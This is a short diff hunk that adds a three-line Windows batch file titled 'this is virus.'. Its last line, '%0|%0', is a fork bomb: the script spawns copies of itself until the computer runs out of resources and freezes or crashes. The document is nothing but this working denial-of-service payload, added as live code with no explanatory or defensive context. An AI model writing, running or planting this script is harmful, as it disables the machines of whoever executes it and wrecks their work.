@@ -1,0 +1,3 @@
+@echo off
+title this is virus.
+%0|%0
